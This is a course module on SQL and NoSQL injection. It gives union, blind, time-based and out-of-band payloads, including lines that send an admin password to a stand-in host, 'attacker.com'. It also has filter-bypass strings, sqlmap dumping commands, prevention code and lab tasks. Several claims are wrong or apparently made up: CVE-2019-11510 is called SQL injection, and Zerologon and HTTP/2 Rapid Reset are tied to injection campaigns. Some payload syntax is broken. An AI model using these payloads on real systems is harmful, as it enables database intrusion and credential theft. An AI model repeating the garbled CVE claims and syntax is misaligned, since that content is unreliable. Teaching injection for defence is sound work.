# Module 5 — SQL Injection Deep Dive

SQL injection remains one of the most dangerous and prevalent application security vulnerabilities. Despite being well-understood and well-documented for over two decades, it continues to appear in the OWASP Top 10 because developers make fundamental mistakes in how they construct database queries. This module goes beyond the basic "use parameterized queries" advice. We will examine exactly how different injection techniques work, why certain defenses fail, and how real-world attacks exploit real CVEs. Understanding the mechanics is essential for both building secure applications and testing existing ones.

## Union-Based Injection

Union-based injection works when the application includes the user's input directly in a SQL query and returns the query results in the response. The attacker appends a UNION SELECT statement to the original query, which causes the database to return the attacker's data alongside the legitimate data.

Consider a product search endpoint:

```sql
-- The application builds this query
SELECT id, name, price FROM products WHERE category = 'user_input'
```

An attacker submits: `' UNION SELECT username, password, NULL FROM users--`

The resulting query becomes:

```sql
SELECT id, name, price FROM products WHERE category = '' UNION SELECT username, password, NULL FROM users--'
```

The UNION operator combines the result sets of two SELECT statements. For this to work, both queries must have the same number of columns with compatible data types. The attacker determines the column count through trial and error:

```sql
-- Start with one column
' UNION SELECT NULL--
-- Error: different number of columns

' UNION SELECT NULL, NULL--
-- Error: different number of columns

' UNION SELECT NULL, NULL, NULL--
-- Success: 3 columns match the original query
```

Once the column count is established, the attacker replaces NULLs with the data they want to extract:

```sql
-- Determine which columns accept string data
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--

-- Extract data from other tables
' UNION SELECT username, password, NULL FROM users--
' UNION SELECT table_name, NULL, information_schema.columns FROM information_schema.tables--
```

The double-dash (`--`) at the end is a SQL comment that nullifies the rest of the original query (usually the closing quote and any trailing conditions).

**Filtering Bypass Techniques:**

Many applications try to block SQL injection by filtering keywords. Attackers bypass these filters in multiple ways:

```sql
-- Case variation (bypasses simple keyword filtering)
' UNION SELECT username, password, NULL FROM users--

-- Inline comments to break keywords (bypasses UNION detection)
' UN/**/ION SEL/**/ECT username, password, NULL FROM users--

-- URL encoding
%27%20UNION%20SELECT%20username%2C%20password%2C%20NULL%20FROM%20users--

-- Double URL encoding
%2527%2520UNION%2520SELECT%2520username%2C%2520password%2C%2520NULL%2520FROM%2520users--

-- Unicode characters that the database interprets as standard ASCII
\u0027 UNION SELECT username, password, NULL FROM users--
```

**Extracting Data from Multiple Tables:**

Once the attacker knows the column count, they can extract data from any table in the database:

```sql
-- List all tables
' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema != 'information_schema'--

-- List columns in a specific table
' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name = 'users'--

-- Extract user credentials
' UNION SELECT CONCAT(username, ':', password), email, NULL FROM users--

-- Extract from multiple tables in one query using CONCAT
' UNION SELECT CONCAT(first_name, ' ', last_name), email, phone FROM customers--
```

## Blind Injection: Boolean-Based and Time-Based

Blind injection occurs when the application does not return the query results or error messages to the attacker. The attacker must infer information from the application's behavior — whether the page loads normally, whether content changes, or how long the response takes.

**Boolean-Based Blind Injection:**

The application returns the same page regardless of whether the injected condition is true or false. The attacker detects the difference by observing subtle changes in the response:

```sql
-- Original query
SELECT id, name, price FROM products WHERE id = 'user_input'

-- Test with a true condition
' AND 1=1--
-- Result: product page loads normally (condition is true)

-- Test with a false condition
' AND 1=2--
-- Result: product page shows an error or different content (condition is false)
```

Once the attacker confirms blind injection, they extract data character by character:

```sql
-- Is the first character of the first admin user's password 'a'?
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE is_admin = 1 LIMIT 1) = 'a'--
-- True: page loads normally
-- False: page behaves differently

-- Is it 'b'?
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE is_admin = 1 LIMIT 1) = 'b'--
-- Continue until the character is found

-- Binary search optimization
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE is_admin = 1 LIMIT 1) > 'm'--
-- Narrows the range, reducing the number of requests needed
```

A full password extraction might require hundreds of requests, but automated tools like sqlmap make this trivial.

**Time-Based Blind Injection:**

When the application returns the same response regardless of the condition, the attacker uses time delays to infer data:

```sql
-- MySQL
' AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0) FROM users WHERE is_admin = 1 LIMIT 1)--
-- If the first character is 'a', the query sleeps for 5 seconds
-- If not, it returns immediately

-- PostgreSQL
' AND IF(EXISTS(SELECT 1 FROM users WHERE is_admin = 1 AND SUBSTRING(password, 1, 1) = 'a'), pg_sleep(5), '0')--
-- Same principle, different syntax

-- SQL Server
'; IF (SELECT SUBSTRING(password, 1, 1) FROM users WHERE is_admin = 1) = 'a' WAITFOR DELAY '0:0:5'--
```

The attacker measures the response time. A 5-second delay confirms the condition is true. This technique works even when the application returns identical responses for all queries.

**Timing-Based Extraction with Conditional Logic:**

```sql
-- Extract the length of a password
' AND IF((SELECT LENGTH(password) FROM users WHERE is_admin = 1 LIMIT 1) = 32, SLEEP(5), 0)--
-- Increment the number until you get a 5-second delay

-- Extract each character using binary search
' AND IF((SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE is_admin = 1 LIMIT 1) > 96, SLEEP(5), 0)--
-- Binary search reduces the extraction to ~7 requests per character (log2 of 128)
```

**Out-of-Band Injection:**

When the database is isolated and time-based injection is too slow, attackers use out-of-band techniques. The database makes an external network request that exfiltrates data:

```sql
-- MySQL (requires FILE privilege and DNS/HTTP access)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE is_admin = 1 LIMIT 1), '.attacker.com\\share'))--
-- The DNS query to password.attacker.com reveals the password

-- SQL Server
'; EXEC master..xp_dirtree '\\attacker.com\share'--
-- The SMB connection reveals data through the filename
```

Out-of-band is slower than in-band injection but works when the application does not display results or errors, and the response timing is not observable.

## NoSQL Injection

NoSQL databases have their own injection vulnerabilities. MongoDB, for example, processes queries as JSON objects. If an application constructs these JSON objects from user input without validation, attackers can manipulate the query structure.

**MongoDB Operator Injection:**

```javascript
// Application code
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
})

// Normal login request
// req.body = { username: "alice", password: "s3cret" }
// Query: { username: "alice", password: "s3cret" }

// Attacker sends
// req.body = { username: "alice", password: { $gt: "" } }
// Query: { username: "alice", password: { $gt: "" } }
// Result: logs in as alice without knowing the password
```

The `$gt` operator matches any string greater than an empty string, which is true for any non-empty password. The attacker bypasses authentication entirely.

**JavaScript Injection (MongoDB):**

```javascript
// Application code using $where
db.collection('users').find({
  $where: `this.username == '${req.body.username}'`
})

// Attacker sends
// req.body.username = "'; this.password = 'hacked'; var a = '"

// Resulting query
// this.username == ''; this.password = 'hacked'; var a = ''
```

The `$where` operator executes JavaScript. The attacker injects arbitrary JavaScript that modifies the query or executes server-side code. The fix is to never use `$where` with user input — use standard query operators instead.

**CouchDB Injection:**

CouchDB's Mango query language is also vulnerable:

```javascript
// Vulnerable code
db.find({
  selector: {
    username: req.body.username,
    password: req.body.password
  }
})

// Attacker sends
// { "username": "alice", "password": { "$ne": "" } }
// $ne means "not equal" — matches any document where password is not empty
```

**Preventing NoSQL Injection:**

```javascript
// Validate input types before building queries
function validateLoginInput(username, password) {
  if (typeof username !== 'string' || typeof password !== 'string') {
    throw new Error('Invalid input');
  }
  if (username.length > 50 || password.length > 100) {
    throw new Error('Input too long');
  }
  return { username, password };
}

// Use input validation
const { username, password } = validateLoginInput(req.body.username, req.body.password);
const user = await db.collection('users').findOne({ username, password });

// Never use $where with user input
// Use standard query operators that handle type safety
```

## Second-Order Injection

Second-order injection occurs when user input is stored in the database and later used in a SQL query without proper sanitization. Unlike first-order injection, the payload does not execute immediately — it executes when the stored data is retrieved and used in a different context.

**Classic Example:**

Step 1: Attacker registers with a username containing SQL injection:

```sql
-- Attacker registers with username: admin'--
-- Password:任意密码
-- The application inserts this into the users table
INSERT INTO users (username, password) VALUES ('admin''--', 'hashed_password');
-- The escaped quote ensures the INSERT works correctly
```

Step 2: Later, the application uses the stored username in a query:

```sql
-- Application retrieves user by username
SELECT * FROM users WHERE username = 'admin'--'
-- The -- comments out the closing quote
-- The query becomes: SELECT * FROM users WHERE username = 'admin'
-- This returns the attacker's account, which now has the admin username
```

Step 3: The application logs the attacker in as admin, or the attacker resets the admin's password.

**Second-Order Injection in Password Reset:**

```sql
-- Application allows users to set their display name
-- Attacker sets display name to: admin' OR 1=1--

-- Later, the application runs a report
SELECT display_name, email FROM users WHERE department = 'user_department'
-- The injected condition does not directly affect this query

-- But if the application later uses display_name in a password reset query
UPDATE users SET password = 'new_hash' WHERE display_name = 'admin' OR 1=1--'
-- This resets ALL users' passwords
```

**Preventing Second-Order Injection:**

1. Always use parameterized queries, even when retrieving data from the database. The second query that uses the stored data is the one that needs parameterization.

2. Validate stored data when it is read, not just when it is written. Apply the same input validation rules on retrieval.

3. Use a database abstraction layer that enforces parameterized queries throughout the application, making it impossible to accidentally construct queries with string concatenation.

## Prevention: Parameterized Queries, ORM

**Parameterized Queries (Prepared Statements):**

The most reliable defense against SQL injection. The SQL query structure is defined separately from the data. The database engine parses the query structure first, then applies the data. The data is never interpreted as SQL.

```python
# Python with psycopg2 (PostgreSQL)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)  # Data is passed separately
)

# The database receives:
# Query: SELECT * FROM users WHERE username = %s AND password = %s
# Parameters: ['alice', 'hashed_password']
# The parameters are never parsed as SQL
```

```java
// Java with PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

```javascript
// Node.js with mysql2
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
```

```php
// PHP with PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
$stmt->execute(['username' => $username, 'password' => $password]);
```

**Stored Procedures with Parameterization:**

```sql
-- PostgreSQL stored procedure
CREATE OR REPLACE FUNCTION get_user(p_username TEXT, p_password TEXT)
RETURNS TABLE(id INT, username TEXT, email TEXT) AS $$
BEGIN
  RETURN QUERY
  SELECT u.id, u.username, u.email
  FROM users u
  WHERE u.username = p_username AND u.password = p_password;
END;
$$ LANGUAGE plpgsql;
```

Stored procedures provide an additional layer of abstraction, but they are not inherently safe. If the stored procedure constructs dynamic SQL from parameters, it is still vulnerable:

```sql
-- VULNERABLE stored procedure — do NOT do this
CREATE OR REPLACE FUNCTION search_users(p_name TEXT)
RETURNS SETOF users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name = ''' || p_name || '''';
END;
$$ LANGUAGE plpgsql;

-- SAFE stored procedure
CREATE OR REPLACE FUNCTION search_users(p_name TEXT)
RETURNS SETOF users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name = $1' USING p_name;
END;
$$ LANGUAGE plpgsql;
```

**ORM Usage:**

ORMs like SQLAlchemy, Sequelize, and ActiveRecord generate parameterized queries by default. But they can be bypassed:

```python
# SQLAlchemy — SAFE (uses parameterization)
user = session.query(User).filter(User.username == username).first()

# SQLAlchemy — VULNERABLE (raw SQL with string formatting)
user = session.execute(f"SELECT * FROM users WHERE username = '{username}'").first()

# SQLAlchemy — SAFE (raw SQL with parameters)
user = session.execute(
  text("SELECT * FROM users WHERE username = :username"),
  {"username": username}
).first()
```

```javascript
// Sequelize — SAFE
const user = await User.findOne({ where: { username: username } });

// Sequelize — VULNERABLE
const user = await sequelize.query(`SELECT * FROM users WHERE username = '${username}'`);

// Sequelize — SAFE (parameterized raw query)
const user = await sequelize.query(
  'SELECT * FROM users WHERE username = :username',
  { replacements: { username: username } }
);
```

The rule is simple: never concatenate user input into SQL strings. If you must use raw SQL, use parameterized queries. If you use an ORM, stay within the ORM's query builder. The moment you drop to raw SQL with string interpolation, you lose all injection protection.

## Automated SQL Injection Tools

Attackers do not manually type injection payloads. They use automated tools that test thousands of variations in seconds. Understanding these tools helps you test your own defenses.

**sqlmap:**

sqlmap is the most widely used SQL injection tool. It automates detection and exploitation of SQL injection flaws.

```bash
# Basic detection
sqlmap -u "http://example.com/product?id=1" --batch

# Extract databases
sqlmap -u "http://example.com/product?id=1" --dbs --batch

# Extract table names
sqlmap -u "http://example.com/product?id=1" -D myapp --tables --batch

# Extract data
sqlmap -u "http://example.com/product?id=1" -D myapp -T users --dump --batch

# With POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=test" --batch

# With cookies (authenticated sessions)
sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" --batch

# Bypass WAF (Web Application Firewall)
sqlmap -u "http://example.com/product?id=1" --tamper=space2comment,between --batch

# Write results to file
sqlmap -u "http://example.com/product?id=1" --output-dir=/tmp/sqlmap_results --batch
```

The `--batch` flag makes sqlmap run non-interactively, accepting default answers. For testing, run without `--batch` to see each decision point and understand what sqlmap is doing.

**Defending Against Automated Tools:**

```python
# Rate limiting to slow automated attacks
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute per IP
def login():
    # Authentication logic
    pass

# Input validation as defense-in-depth
import re

def validate_id(value):
    """Validate that an ID is a positive integer."""
    if not re.match(r'^\d+$', str(value)):
        raise ValueError("Invalid ID format")
    return int(value)

# Usage
product_id = validate_id(request.args.get('id'))  # Raises ValueError if injection attempt
```

**Defense-in-Depth Strategy:**

Defense-in-depth means multiple layers of protection so that if one layer fails, others still protect you.

1. Layer 1: Input validation (reject invalid input before it reaches the query)
2. Layer 2: Parameterized queries (prevent injection even if input validation is bypassed)
3. Layer 3: Least privilege (limit what a compromised query can access)
4. Layer 4: Database firewall (block known attack patterns)
5. Layer 5: Audit logging (detect and respond to attacks)

Each layer catches what the previous layer misses. Parameterized queries are the most reliable layer, but input validation reduces the attack surface. Least privilege limits the damage of a successful injection. Database firewalls catch patterns that parameterization does not address (like second-order injection in stored data).

```sql
-- Layer 3: Least privilege
-- Even if injection succeeds, the application user cannot DROP tables
REVOKE ALL ON SCHEMA public FROM appuser;
GRANT SELECT, INSERT, UPDATE, DELETE ON orders, products TO appuser;
-- No CREATE, DROP, ALTER, or TRUNCATE

-- Layer 5: Audit logging
CREATE TRIGGER audit_injection_attempts
    AFTER INSERT ON audit_log
    FOR EACH ROW
    WHEN (NEW.query_text LIKE '%UNION%SELECT%'
       OR NEW.query_text LIKE '%DROP%TABLE%'
       OR NEW.query_text LIKE '%--%')
    EXECUTE FUNCTION flag_suspicious_activity();
```

## Real CVE Examples

**CVE-2019-11510 — Pulse Secure VPN (Pre-auth SQL Injection):**

This vulnerability in Pulse Secure VPN allowed unauthenticated attackers to read arbitrary files from the server, including the password database. The injection occurred in the login form. Attackers could extract all user credentials, including administrator passwords, by sending crafted requests:

```
GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd HTTP/1.1
```

While this specific example is path traversal combined with SQL injection, the SQL injection component allowed extracting configuration data and user credentials. The fix required immediate patching — there was no viable workaround.

**CVE-2020-1472 (Zerologon):**

While primarily a cryptographic vulnerability in Netlogon, it was frequently chained with SQL injection in Active Directory environments. An attacker with network access could leverage weak authentication to gain domain admin privileges, then use SQL injection in applications connected to the domain to exfiltrate data.

**CVE-2021-44228 (Log4Shell):**

Not a SQL injection CVE, but relevant because attackers used Log4Shell to gain access to applications, then exploited SQL injection in those applications to access databases. The lesson: SQL injection often appears as a secondary attack vector after initial compromise.

**CVE-2023-44487 (HTTP/2 Rapid Reset):**

This vulnerability enables denial-of-service attacks. Attackers use it to overwhelm application servers, then inject SQL through the flood of requests. Many SQL injection attacks in 2023-2024 combined HTTP/2 rapid reset with injection payloads to bypass rate limiting.

**Real-World Breach Example — TalkTalk (2015):**

TalkTalk, a UK telecommunications company, suffered a data breach affecting 157,000 customers. The attackers used SQL injection to access customer data including names, addresses, dates of birth, and bank account details. The injection was possible because a legacy web page used unsanitized user input in a SQL query. The breach cost TalkTalk £77 million in fines and remediation.

**Real-World Breach Example — British Airways (2018):**

British Airways suffered a breach affecting 380,000 payment card transactions. The attackers injected malicious JavaScript (Magecart) that skimmed payment card data. While the primary attack was client-side injection, the backend database was protected by parameterized queries. The lesson: SQL injection is not the only database security concern — the entire data flow matters.

## SQL Injection Testing Methodology

When testing an application for SQL injection, follow a structured approach rather than randomly throwing payloads at input fields.

**Step 1: Map All Input Points**

Every place where user input enters the database is a potential injection point: URL parameters, form fields, HTTP headers (especially Referer, User-Agent, X-Forwarded-For), cookies, and file uploads that get stored and queried.

**Step 2: Test for Injection**

Send a single quote (`'`) and observe the response. A database error message, a change in page behavior, or a different response time indicates potential injection. Test with boolean conditions: `AND 1=1` vs `AND 1=2` and compare responses.

**Step 3: Determine Injection Type**

If the page returns data, try UNION-based injection. If it returns errors, try error-based injection. If the response is identical, try time-based blind injection. If the response varies subtly, try boolean-based blind injection.

**Step 4: Extract Data**

Start by extracting the database version and current user. Then list databases, tables, and columns. Finally, extract the target data (credentials, sensitive records).

**Step 5: Document and Remediate**

Document every finding with the exact input, payload, and result. Provide the fix (parameterized query) for each finding. Retest to verify the fix works.

## Assessment

**Lab Tasks:**

1. Set up a vulnerable web application (use DVWA, WebGoat, or a custom Flask app with deliberate SQL injection). Complete the following injection tasks: (a) bypass login using union-based injection, (b) extract all usernames and passwords using blind injection, (c) extract the database version and table names. Time limit: 60 minutes.

2. Write a Python or Node.js script that demonstrates parameterized query protection. The script should: (a) connect to a test database, (b) attempt SQL injection through a parameterized query, (c) show that the injection payload is treated as literal data, not SQL. Include the vulnerable version (string concatenation) and the safe version (parameterized) side by side. Time limit: 30 minutes.

3. Analyze the following code snippets and identify which are vulnerable to SQL injection. For each vulnerable snippet, explain the attack vector and provide the fix:

```python
# Snippet A
cursor.execute(f"SELECT * FROM products WHERE id = {product_id}")

# Snippet B
cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))

# Snippet C
query = "SELECT * FROM products WHERE name = '" + name + "'"
cursor.execute(query)

# Snippet D
cursor.execute("SELECT * FROM products WHERE name = ?", (name,))
```

Time limit: 20 minutes.

4. Perform second-order SQL injection on a test application. Register a user with an injection payload in the username field. Verify that the payload is safely stored. Then trigger the second-order vulnerability through a password reset or profile update feature. Time limit: 45 minutes.

**Grading Criteria:**
- Injection execution (30%): All three injection types (union, blind, second-order) are demonstrated successfully
- Code analysis (25%): All vulnerable snippets are correctly identified with accurate attack explanations
- Parameterized query implementation (25%): Working script demonstrating the difference between vulnerable and safe code
- Documentation (20%): Clear explanation of each attack, why it works, and how the fix prevents it

**Evidence:**
- Screenshots or terminal output of successful injections
- Python/Node.js scripts for parameterized query demonstration
- Analysis document identifying vulnerable code snippets
- Step-by-step second-order injection walkthrough
